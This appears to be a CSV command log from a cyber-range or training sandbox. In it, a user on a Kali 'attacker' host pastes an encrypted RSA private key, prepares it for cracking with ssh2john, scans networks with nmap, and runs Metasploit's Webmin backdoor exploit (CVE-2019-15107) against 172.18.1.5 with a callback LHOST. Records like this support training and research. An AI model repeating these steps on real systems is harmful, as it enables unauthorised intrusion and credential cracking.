sandbox_id,cmd_type,cmd_name,cmd_arguments,hostname,ip,level,username,timestamp_str,relative_timestamp_str
643,bash-command,KHGCl8kHWe7ks3KT4+WU9uZZAhAECaWJvLzo2Ba6dst/Ke7KEtmGwv5Ex...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:53:16.367Z,1970-01-01T01:15:42.713Z
643,bash-command,KHGCl8kHWe7ks3KT4+WU9uZZAhAECaWJvLzo2Ba6dst/Ke7KEtmGwv5Ex...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:53:16.407Z,1970-01-01T01:15:42.753Z
643,bash-command,0mt+olWJFSJa072UPuHe7gWdlexqh0l59q4ohOG+zJke1u74Br9wo6KIv...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:53:16.597Z,1970-01-01T01:15:42.943Z
643,bash-command,0mt+olWJFSJa072UPuHe7gWdlexqh0l59q4ohOG+zJke1u74Br9wo6KIv...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:53:16.634Z,1970-01-01T01:15:42.980Z
643,bash-command,y2O0rVCjsin3d2h9F0Fp0Xvc3EHZD7ct2HvZEV6x3kUlfdWeHKuF+7wUe...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:53:16.825Z,1970-01-01T01:15:43.171Z
643,bash-command,y2O0rVCjsin3d2h9F0Fp0Xvc3EHZD7ct2HvZEV6x3kUlfdWeHKuF+7wUe...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:53:16.862Z,1970-01-01T01:15:43.208Z
643,bash-command,9+LnogQTclKAVk8htnrxBQh7aPLBAyTaXACAL31bB0ZXfh0yhJX6bXIe+...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:53:17.049Z,1970-01-01T01:15:43.395Z
643,bash-command,9+LnogQTclKAVk8htnrxBQh7aPLBAyTaXACAL31bB0ZXfh0yhJX6bXIe+...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:53:17.086Z,1970-01-01T01:15:43.432Z
643,bash-command,rJf/WLYf6/Lmfgv/ECF+VqdLPGkLT8dEgrajh9t2TaoU+/+mxtGXaJ7Ie...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:53:17.164Z,1970-01-01T01:15:43.510Z
643,bash-command,rJf/WLYf6/Lmfgv/ECF+VqdLPGkLT8dEgrajh9t2TaoU+/+mxtGXaJ7Ie...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:53:17.197Z,1970-01-01T01:15:43.543Z
643,bash-command,22unE+jCDSQMF9IygWb8HfzBsruZ7IQ+/h7g7XDpEZrJf6+mdmbzBXLwl...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:53:17.286Z,1970-01-01T01:15:43.632Z
643,bash-command,22unE+jCDSQMF9IygWb8HfzBsruZ7IQ+/h7g7XDpEZrJf6+mdmbzBXLwl...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:53:17.310Z,1970-01-01T01:15:43.656Z
643,bash-command,clear,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:53:19.448Z,1970-01-01T01:15:45.794Z
643,bash-command,python3,ssh2john.py Ps9uCxB/vjzzEwZU+BjohF/sb/kaa+thfeYki9iFGqVQpHbPhdZU7JO2rKTU3w4k > hash,attacker,10.1.135.83,38,kali,2022-05-04T07:54:09.436Z,1970-01-01T01:16:35.782Z
643,bash-command,python3,ssh2john.py Ps9uCxB/vjzzEwZU+BjohF/sb/kaa+thfeYki9iFGqVQpHbPhdZU7JO2rKTU3w4k > hash,attacker,10.1.135.83,38,kali,2022-05-04T07:54:09.475Z,1970-01-01T01:16:35.821Z
643,bash-command,2OG1q9DAD07fQPpCmX5vqWAdmeaWq//2k3zRVsadFF3daPGjWs1f61j4/...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:54:09.556Z,1970-01-01T01:16:35.902Z
643,bash-command,2OG1q9DAD07fQPpCmX5vqWAdmeaWq//2k3zRVsadFF3daPGjWs1f61j4/...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:54:09.597Z,1970-01-01T01:16:35.943Z
643,bash-command,yeX8g98mtBLBas7bUFuo4jVroEUaoF0fpa0Up+mOAC3rY3tsprpfofQu+...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:54:09.802Z,1970-01-01T01:16:36.148Z
643,bash-command,yeX8g98mtBLBas7bUFuo4jVroEUaoF0fpa0Up+mOAC3rY3tsprpfofQu+...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:54:09.843Z,1970-01-01T01:16:36.189Z
643,bash-command,Bq2CuS5LcqbfVfl9737XeC+DNls/AmkLmYU/1NLKp1hWSpx0/dfJu725t...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:54:09.927Z,1970-01-01T01:16:36.273Z
643,bash-command,Bq2CuS5LcqbfVfl9737XeC+DNls/AmkLmYU/1NLKp1hWSpx0/dfJu725t...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:54:09.969Z,1970-01-01T01:16:36.315Z
643,bash-command,9lS9eEPebv4V8mUNU+bsh5YQbVrVmryO9BRLBl4ZK82SO7tnyObpWfsa2...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:54:10.170Z,1970-01-01T01:16:36.516Z
643,bash-command,9lS9eEPebv4V8mUNU+bsh5YQbVrVmryO9BRLBl4ZK82SO7tnyObpWfsa2...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:54:10.209Z,1970-01-01T01:16:36.555Z
643,bash-command,N/jFdUnWSkA2wEgzupDZmPU6jyJ/BosOxJVkih4oQB1s9BO+HzI7oA5sD...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:54:10.288Z,1970-01-01T01:16:36.634Z
643,bash-command,N/jFdUnWSkA2wEgzupDZmPU6jyJ/BosOxJVkih4oQB1s9BO+HzI7oA5sD...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:54:10.329Z,1970-01-01T01:16:36.675Z
643,bash-command,BdC2V8RnF8i8gwppc2eenbU/PIdDTu6M2LTO4aAM5wxwKXgkTdJuUxmNH...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:54:10.410Z,1970-01-01T01:16:36.756Z
643,bash-command,BdC2V8RnF8i8gwppc2eenbU/PIdDTu6M2LTO4aAM5wxwKXgkTdJuUxmNH...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:54:10.463Z,1970-01-01T01:16:36.809Z
643,bash-command,/DJyNP3xqCknFLIVTBwVSsHqnHSN6ZCl8BteFdRsf6kAj6qm1/cAfL73o...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:54:10.544Z,1970-01-01T01:16:36.890Z
643,bash-command,/DJyNP3xqCknFLIVTBwVSsHqnHSN6ZCl8BteFdRsf6kAj6qm1/cAfL73o...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:54:10.586Z,1970-01-01T01:16:36.932Z
643,bash-command,5PHI1jf+WoJVaRKQLzFfaMrY0rhU6TsQTYdm2QYcSszE1fhLdXGNKpath...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:54:10.797Z,1970-01-01T01:16:37.143Z
643,bash-command,5PHI1jf+WoJVaRKQLzFfaMrY0rhU6TsQTYdm2QYcSszE1fhLdXGNKpath...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:54:10.840Z,1970-01-01T01:16:37.186Z
643,bash-command,RPbgJfB0PuzwpzcKesh5j+AnjKQjZcG1vHnrgvDFnd5VNOOrTzdUnMA0D...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:54:11.060Z,1970-01-01T01:16:37.406Z
643,bash-command,RPbgJfB0PuzwpzcKesh5j+AnjKQjZcG1vHnrgvDFnd5VNOOrTzdUnMA0D...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:54:11.104Z,1970-01-01T01:16:37.450Z
643,bash-command,vkjUvPbdIkQlNuBL0FWZl/2vHf/xWWex4Q0plLf7lRWJsCDtiKflKHL/S...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:54:11.198Z,1970-01-01T01:16:37.544Z
643,bash-command,vkjUvPbdIkQlNuBL0FWZl/2vHf/xWWex4Q0plLf7lRWJsCDtiKflKHL/S...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:54:11.238Z,1970-01-01T01:16:37.584Z
643,bash-command,TwKMZJ4885lBJfN3AG9kj4azCLK6IcAuRoxTmAtYrntQWLtDCHyaCW6dZ...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:54:11.436Z,1970-01-01T01:16:37.782Z
643,bash-command,TwKMZJ4885lBJfN3AG9kj4azCLK6IcAuRoxTmAtYrntQWLtDCHyaCW6dZ...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:54:11.475Z,1970-01-01T01:16:37.821Z
643,bash-command,pghYqk7inYawVLDG9f5ej+1MYQNfScZYpQ/IEH2jfbRgQsXj7zgtS9ewQ...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:54:11.568Z,1970-01-01T01:16:37.914Z
643,bash-command,pghYqk7inYawVLDG9f5ej+1MYQNfScZYpQ/IEH2jfbRgQsXj7zgtS9ewQ...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:54:11.594Z,1970-01-01T01:16:37.940Z
643,bash-command,TC+mWTFkXW5YlN9Bu1uZ2CgYQJF0Dx1ns5x3IeF+U5z56KRqaKFJPfRQg...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:54:11.795Z,1970-01-01T01:16:38.141Z
643,bash-command,TC+mWTFkXW5YlN9Bu1uZ2CgYQJF0Dx1ns5x3IeF+U5z56KRqaKFJPfRQg...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:54:11.834Z,1970-01-01T01:16:38.180Z
643,bash-command,0v/8aKPlPwfmS28OtxtE96zQI3SAAy7AdwkBepz5Pk9iotqIQPk5fY68w...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:54:11.914Z,1970-01-01T01:16:38.260Z
643,bash-command,0v/8aKPlPwfmS28OtxtE96zQI3SAAy7AdwkBepz5Pk9iotqIQPk5fY68w...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:54:11.953Z,1970-01-01T01:16:38.299Z
643,bash-command,d712Dnn4OPYaqzMTyWz/dRiWcax9bFhNV+9Gp1OoA7hhBO5daLoul3EYx...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:54:12.032Z,1970-01-01T01:16:38.378Z
643,bash-command,d712Dnn4OPYaqzMTyWz/dRiWcax9bFhNV+9Gp1OoA7hhBO5daLoul3EYx...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:54:12.071Z,1970-01-01T01:16:38.417Z
643,bash-command,qJkjc4ljMYr9wvRRcWEhlvQV6LTk2FiYOY4tjRneLXMfsb2BUwSFDXDwD...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:54:12.299Z,1970-01-01T01:16:38.645Z
643,bash-command,qJkjc4ljMYr9wvRRcWEhlvQV6LTk2FiYOY4tjRneLXMfsb2BUwSFDXDwD...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:54:12.338Z,1970-01-01T01:16:38.684Z
643,bash-command,rk6oUkbp2aFy5SgMwdlm6tc5sHVHVOLTfeyv7AvRUOaGXbbrUBw1rxgsw...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:54:12.552Z,1970-01-01T01:16:38.898Z
643,bash-command,rk6oUkbp2aFy5SgMwdlm6tc5sHVHVOLTfeyv7AvRUOaGXbbrUBw1rxgsw...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:54:12.588Z,1970-01-01T01:16:38.934Z
643,bash-command,anC3ZW1EHY/nUmSq9myKG5rPdgFhqx7lPBb5eXSGcA+rFkxkQwbtROw73...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:54:12.668Z,1970-01-01T01:16:39.014Z
643,bash-command,anC3ZW1EHY/nUmSq9myKG5rPdgFhqx7lPBb5eXSGcA+rFkxkQwbtROw73...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:54:12.709Z,1970-01-01T01:16:39.055Z
643,bash-command,FKuYCbpmfnY0ZBxR9NVh/kRpv5VI013Mwqk2lcuJTc+mjlHOymyXAhY02...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:54:12.798Z,1970-01-01T01:16:39.144Z
643,bash-command,FKuYCbpmfnY0ZBxR9NVh/kRpv5VI013Mwqk2lcuJTc+mjlHOymyXAhY02...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:54:12.828Z,1970-01-01T01:16:39.174Z
643,bash-command,TleEMFlW9oXD56B21kVdPDP9McdLgC9//2pSh8sI5kJEsNd294g8ju/dD...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:54:12.908Z,1970-01-01T01:16:39.254Z
643,bash-command,TleEMFlW9oXD56B21kVdPDP9McdLgC9//2pSh8sI5kJEsNd294g8ju/dD...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:54:12.950Z,1970-01-01T01:16:39.296Z
643,bash-command,aqa9d+Nsbodr90LgBOFRdtxUeYihXLS2ZfXE5wYfTwX17ZIoFLuYamE6O...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:54:13.158Z,1970-01-01T01:16:39.504Z
643,bash-command,aqa9d+Nsbodr90LgBOFRdtxUeYihXLS2ZfXE5wYfTwX17ZIoFLuYamE6O...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:54:13.196Z,1970-01-01T01:16:39.542Z
643,bash-command,uSoF68eAZXd6R9bL03s9HQvGkSZv8zaFlmK4wRVI5frYMlU5gzD5E/e6I...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:54:13.286Z,1970-01-01T01:16:39.632Z
643,bash-command,uSoF68eAZXd6R9bL03s9HQvGkSZv8zaFlmK4wRVI5frYMlU5gzD5E/e6I...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:54:13.322Z,1970-01-01T01:16:39.668Z
643,bash-command,pq5zI0lH1Vf4jlhYpD/PXMmULzR28OIOVrkcUeZPVlv+aIpLd6zbe8mfI...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:54:13.404Z,1970-01-01T01:16:39.750Z
643,bash-command,pq5zI0lH1Vf4jlhYpD/PXMmULzR28OIOVrkcUeZPVlv+aIpLd6zbe8mfI...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:54:13.445Z,1970-01-01T01:16:39.791Z
643,bash-command,clear,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:54:37.124Z,1970-01-01T01:17:03.470Z
643,msf-command,exit,NONE,attacker,10.1.135.83,38,null,2022-05-04T07:55:32.659Z,1970-01-01T01:17:59.005Z
643,bash-command,msfconsole,Metasploit,attacker,10.1.135.83,38,kali,2022-05-04T07:55:32.752Z,1970-01-01T01:17:59.098Z
643,msf-command,backgrounf,NONE,attacker,10.1.135.83,38,null,2022-05-04T07:55:48.084Z,1970-01-01T01:18:14.430Z
643,msf-command,background,NONE,attacker,10.1.135.83,38,null,2022-05-04T07:55:50.512Z,1970-01-01T01:18:16.858Z
643,msf-command,sessions,-u 1,attacker,10.1.135.83,38,null,2022-05-04T07:56:10.525Z,1970-01-01T01:18:36.871Z
643,msf-command,exit,NONE,attacker,10.1.135.83,38,null,2022-05-04T07:56:39.201Z,1970-01-01T01:19:05.547Z
643,bash-command,msfconsole,Metasploit,attacker,10.1.135.83,38,kali,2022-05-04T07:56:39.240Z,1970-01-01T01:19:05.586Z
643,msf-command,background,NONE,attacker,10.1.135.83,38,null,2022-05-04T07:56:55.529Z,1970-01-01T01:19:21.875Z
643,msf-command,-----BEGIN,RSA PRIVATE KEY-----,attacker,10.1.135.83,38,null,2022-05-04T07:58:07.688Z,1970-01-01T01:20:34.034Z
643,msf-command,Proc-Type:,4(comma)ENCRYPTED,attacker,10.1.135.83,38,null,2022-05-04T07:58:07.803Z,1970-01-01T01:20:34.149Z
643,msf-command,DEK-Info:,AES-128-CBC(comma)48A98AC639005A4158AA7B9CEEF483C4,attacker,10.1.135.83,38,null,2022-05-04T07:58:07.923Z,1970-01-01T01:20:34.269Z
643,msf-command,Ps9uCxB/vjzzEwZU+BjohF/sb/kaa+thfeYki9iFGqVQpHbPhdZU7JO2r...,NONE,attacker,10.1.135.83,38,null,2022-05-04T07:58:08.057Z,1970-01-01T01:20:34.403Z
643,msf-command,2OG1q9DAD07fQPpCmX5vqWAdmeaWq//2k3zRVsadFF3daPGjWs1f61j4/...,NONE,attacker,10.1.135.83,38,null,2022-05-04T07:58:08.191Z,1970-01-01T01:20:34.537Z
643,msf-command,yeX8g98mtBLBas7bUFuo4jVroEUaoF0fpa0Up+mOAC3rY3tsprpfofQu+...,NONE,attacker,10.1.135.83,38,null,2022-05-04T07:58:08.466Z,1970-01-01T01:20:34.812Z
643,msf-command,Bq2CuS5LcqbfVfl9737XeC+DNls/AmkLmYU/1NLKp1hWSpx0/dfJu725t...,NONE,attacker,10.1.135.83,38,null,2022-05-04T07:58:08.637Z,1970-01-01T01:20:34.983Z
643,msf-command,9lS9eEPebv4V8mUNU+bsh5YQbVrVmryO9BRLBl4ZK82SO7tnyObpWfsa2...,NONE,attacker,10.1.135.83,38,null,2022-05-04T07:58:08.760Z,1970-01-01T01:20:35.106Z
643,msf-command,N/jFdUnWSkA2wEgzupDZmPU6jyJ/BosOxJVkih4oQB1s9BO+HzI7oA5sD...,NONE,attacker,10.1.135.83,38,null,2022-05-04T07:58:08.883Z,1970-01-01T01:20:35.229Z
643,msf-command,BdC2V8RnF8i8gwppc2eenbU/PIdDTu6M2LTO4aAM5wxwKXgkTdJuUxmNH...,NONE,attacker,10.1.135.83,38,null,2022-05-04T07:58:09.006Z,1970-01-01T01:20:35.352Z
643,msf-command,/DJyNP3xqCknFLIVTBwVSsHqnHSN6ZCl8BteFdRsf6kAj6qm1/cAfL73o...,NONE,attacker,10.1.135.83,38,null,2022-05-04T07:58:09.138Z,1970-01-01T01:20:35.484Z
643,msf-command,5PHI1jf+WoJVaRKQLzFfaMrY0rhU6TsQTYdm2QYcSszE1fhLdXGNKpath...,NONE,attacker,10.1.135.83,38,null,2022-05-04T07:58:09.262Z,1970-01-01T01:20:35.608Z
643,msf-command,RPbgJfB0PuzwpzcKesh5j+AnjKQjZcG1vHnrgvDFnd5VNOOrTzdUnMA0D...,NONE,attacker,10.1.135.83,38,null,2022-05-04T07:58:09.400Z,1970-01-01T01:20:35.746Z
643,msf-command,vkjUvPbdIkQlNuBL0FWZl/2vHf/xWWex4Q0plLf7lRWJsCDtiKflKHL/S...,NONE,attacker,10.1.135.83,38,null,2022-05-04T07:58:09.655Z,1970-01-01T01:20:36.001Z
643,msf-command,TwKMZJ4885lBJfN3AG9kj4azCLK6IcAuRoxTmAtYrntQWLtDCHyaCW6dZ...,NONE,attacker,10.1.135.83,38,null,2022-05-04T07:58:09.785Z,1970-01-01T01:20:36.131Z
643,msf-command,pghYqk7inYawVLDG9f5ej+1MYQNfScZYpQ/IEH2jfbRgQsXj7zgtS9ewQ...,NONE,attacker,10.1.135.83,38,null,2022-05-04T07:58:09.913Z,1970-01-01T01:20:36.259Z
643,msf-command,TC+mWTFkXW5YlN9Bu1uZ2CgYQJF0Dx1ns5x3IeF+U5z56KRqaKFJPfRQg...,NONE,attacker,10.1.135.83,38,null,2022-05-04T07:58:10.033Z,1970-01-01T01:20:36.379Z
643,msf-command,0v/8aKPlPwfmS28OtxtE96zQI3SAAy7AdwkBepz5Pk9iotqIQPk5fY68w...,NONE,attacker,10.1.135.83,38,null,2022-05-04T07:58:10.152Z,1970-01-01T01:20:36.498Z
643,msf-command,d712Dnn4OPYaqzMTyWz/dRiWcax9bFhNV+9Gp1OoA7hhBO5daLoul3EYx...,NONE,attacker,10.1.135.83,38,null,2022-05-04T07:58:10.282Z,1970-01-01T01:20:36.628Z
643,msf-command,qJkjc4ljMYr9wvRRcWEhlvQV6LTk2FiYOY4tjRneLXMfsb2BUwSFDXDwD...,NONE,attacker,10.1.135.83,38,null,2022-05-04T07:58:10.522Z,1970-01-01T01:20:36.868Z
643,msf-command,rk6oUkbp2aFy5SgMwdlm6tc5sHVHVOLTfeyv7AvRUOaGXbbrUBw1rxgsw...,NONE,attacker,10.1.135.83,38,null,2022-05-04T07:58:10.686Z,1970-01-01T01:20:37.032Z
643,msf-command,anC3ZW1EHY/nUmSq9myKG5rPdgFhqx7lPBb5eXSGcA+rFkxkQwbtROw73...,NONE,attacker,10.1.135.83,38,null,2022-05-04T07:58:10.812Z,1970-01-01T01:20:37.158Z
643,msf-command,FKuYCbpmfnY0ZBxR9NVh/kRpv5VI013Mwqk2lcuJTc+mjlHOymyXAhY02...,NONE,attacker,10.1.135.83,38,null,2022-05-04T07:58:10.932Z,1970-01-01T01:20:37.278Z
643,msf-command,TleEMFlW9oXD56B21kVdPDP9McdLgC9//2pSh8sI5kJEsNd294g8ju/dD...,NONE,attacker,10.1.135.83,38,null,2022-05-04T07:58:11.053Z,1970-01-01T01:20:37.399Z
643,msf-command,aqa9d+Nsbodr90LgBOFRdtxUeYihXLS2ZfXE5wYfTwX17ZIoFLuYamE6O...,NONE,attacker,10.1.135.83,38,null,2022-05-04T07:58:11.187Z,1970-01-01T01:20:37.533Z
643,msf-command,uSoF68eAZXd6R9bL03s9HQvGkSZv8zaFlmK4wRVI5frYMlU5gzD5E/e6I...,NONE,attacker,10.1.135.83,38,null,2022-05-04T07:58:11.310Z,1970-01-01T01:20:37.656Z
643,msf-command,pq5zI0lH1Vf4jlhYpD/PXMmULzR28OIOVrkcUeZPVlv+aIpLd6zbe8mfI...,NONE,attacker,10.1.135.83,38,null,2022-05-04T07:58:11.452Z,1970-01-01T01:20:37.798Z
643,msf-command,Q9Z2LPIWU200w5daHsXp/qukKdDn1CB4JinKvtLka3Q4i6EHj+Vp7bvhm...,NONE,attacker,10.1.135.83,38,null,2022-05-04T07:58:11.715Z,1970-01-01T01:20:38.061Z
643,msf-command,/BXnD+JMm+w9ZTRsHqrXKsAEyVhM99hWoFz2k1s+Q003y/7I/0XmPETD4...,NONE,attacker,10.1.135.83,38,null,2022-05-04T07:58:11.853Z,1970-01-01T01:20:38.199Z
643,msf-command,WzolChBDCjWIMZ/9j5JREtzWX3s7+k32TFws/jPKzXEB21M2Szn23pkoX...,NONE,attacker,10.1.135.83,38,null,2022-05-04T07:58:11.974Z,1970-01-01T01:20:38.320Z
643,msf-command,bTXmV+hQf+gS7PjVRthqPONau6on19uDDVXNeuVygP4T8H5v6kAurFVX1...,NONE,attacker,10.1.135.83,38,null,2022-05-04T07:58:12.096Z,1970-01-01T01:20:38.442Z
692,bash-command,ls,NONE,attacker,10.1.135.83,34,kali,2022-05-04T12:45:11.169Z,1970-01-01T00:04:27.195Z
692,bash-command,pwd,NONE,attacker,10.1.135.83,34,kali,2022-05-04T12:45:14.721Z,1970-01-01T00:04:30.747Z
692,bash-command,head,ssh2john.py,attacker,10.1.135.83,34,kali,2022-05-04T12:45:38.324Z,1970-01-01T00:04:54.350Z
692,bash-command,cat,ssh2john.py,attacker,10.1.135.83,34,kali,2022-05-04T12:45:44.922Z,1970-01-01T00:05:00.948Z
692,bash-command,ifconfig,-a,attacker,10.1.135.83,34,kali,2022-05-04T12:47:40.216Z,1970-01-01T00:06:56.242Z
692,bash-command,nmap,-sP 192.168.100.0/24,attacker,10.1.135.83,34,kali,2022-05-04T12:50:14.805Z,1970-01-01T00:09:30.831Z
692,bash-command,sudo,nmap -sn 192.168.4.0/24,attacker,10.1.135.83,34,kali,2022-05-04T12:55:43.826Z,1970-01-01T00:14:59.852Z
692,bash-command,nmap,-sV 192.168.4.0/24,attacker,10.1.135.83,34,kali,2022-05-04T12:57:37.536Z,1970-01-01T00:16:53.562Z
692,bash-command,ip,config,attacker,10.1.135.83,34,kali,2022-05-04T12:58:37.025Z,1970-01-01T00:17:53.051Z
692,bash-command,nmap,172.18.1.5,attacker,10.1.135.83,34,kali,2022-05-04T12:58:57.747Z,1970-01-01T00:18:13.773Z
692,bash-command,ip,addr,attacker,10.1.135.83,34,kali,2022-05-04T12:59:41.159Z,1970-01-01T00:18:57.185Z
692,bash-command,nmap,-sV,attacker,10.1.135.83,34,kali,2022-05-04T13:00:17.563Z,1970-01-01T00:19:33.589Z
692,bash-command,nmap,-sV,attacker,10.1.135.83,34,kali,2022-05-04T13:00:34.056Z,1970-01-01T00:19:50.082Z
692,bash-command,nmap,-sV,attacker,10.1.135.83,34,kali,2022-05-04T13:00:34.083Z,1970-01-01T00:19:50.109Z
692,bash-command,nmap,-sV 172.18.1.5,attacker,10.1.135.83,34,kali,2022-05-04T13:01:23.514Z,1970-01-01T00:20:39.540Z
692,bash-command,nmap,-sV 172.18.1.5 -p 10000,attacker,10.1.135.83,34,kali,2022-05-04T13:02:53.735Z,1970-01-01T00:22:09.761Z
692,bash-command,nmap,-sV 172.18.1.5 -p 22,attacker,10.1.135.83,34,kali,2022-05-04T13:03:42.571Z,1970-01-01T00:22:58.597Z
692,bash-command,ls,NONE,attacker,10.1.135.83,34,kali,2022-05-04T13:04:23.870Z,1970-01-01T00:23:39.896Z
692,bash-command,cat,ssh2john.py,attacker,10.1.135.83,34,kali,2022-05-04T13:04:31.274Z,1970-01-01T00:23:47.300Z
692,bash-command,ls,NONE,attacker,10.1.135.83,34,kali,2022-05-04T13:05:01.967Z,1970-01-01T00:24:17.993Z
692,bash-command,nmap,-sV 172.18.1.5 -p 22,attacker,10.1.135.83,34,kali,2022-05-04T13:05:23.327Z,1970-01-01T00:24:39.353Z
692,bash-command,nmap,-sV 172.18.1.5 -p 10000,attacker,10.1.135.83,35,kali,2022-05-04T13:06:11.210Z,1970-01-01T00:25:27.236Z
692,msf-command,search,CVE-2019-15107,attacker,10.1.135.83,36,null,2022-05-04T13:24:15.333Z,1970-01-01T00:43:31.359Z
692,msf-command,use,exploit/linux/http/webmin_backdoor,attacker,10.1.135.83,36,null,2022-05-04T13:24:56.424Z,1970-01-01T00:44:12.450Z
692,msf-command,ls,NONE,attacker,10.1.135.83,36,null,2022-05-04T13:25:59.861Z,1970-01-01T00:45:15.887Z
692,msf-command,exploit,NONE,attacker,10.1.135.83,36,null,2022-05-04T13:27:51.277Z,1970-01-01T00:47:07.303Z
692,msf-command,shiw,info,attacker,10.1.135.83,36,null,2022-05-04T13:28:48.798Z,1970-01-01T00:48:04.824Z
692,msf-command,show,info,attacker,10.1.135.83,36,null,2022-05-04T13:28:55.603Z,1970-01-01T00:48:11.629Z
692,msf-command,show,option,attacker,10.1.135.83,36,null,2022-05-04T13:30:39.970Z,1970-01-01T00:49:55.996Z
692,msf-command,show,options,attacker,10.1.135.83,36,null,2022-05-04T13:30:42.153Z,1970-01-01T00:49:58.179Z
692,msf-command,set,parameter RHOSTS 172.18.1.5,attacker,10.1.135.83,36,null,2022-05-04T13:33:19.172Z,1970-01-01T00:52:35.198Z
692,msf-command,set,parameter LHOST 10.1.135.83,attacker,10.1.135.83,36,null,2022-05-04T13:33:39.396Z,1970-01-01T00:52:55.422Z
692,msf-command,exploit,NONE,attacker,10.1.135.83,36,null,2022-05-04T13:33:52.938Z,1970-01-01T00:53:08.964Z
692,msf-command,run,NONE,attacker,10.1.135.83,36,null,2022-05-04T13:33:58.432Z,1970-01-01T00:53:14.458Z
692,msf-command,set,RHOSTS 172.18.1.5,attacker,10.1.135.83,36,null,2022-05-04T13:34:57.713Z,1970-01-01T00:54:13.739Z
692,msf-command,set,LHOST 10.1.135.83,attacker,10.1.135.83,36,null,2022-05-04T13:35:16.419Z,1970-01-01T00:54:32.445Z
692,msf-command,exploit,NONE,attacker,10.1.135.83,36,null,2022-05-04T13:38:11.062Z,1970-01-01T00:57:27.088Z
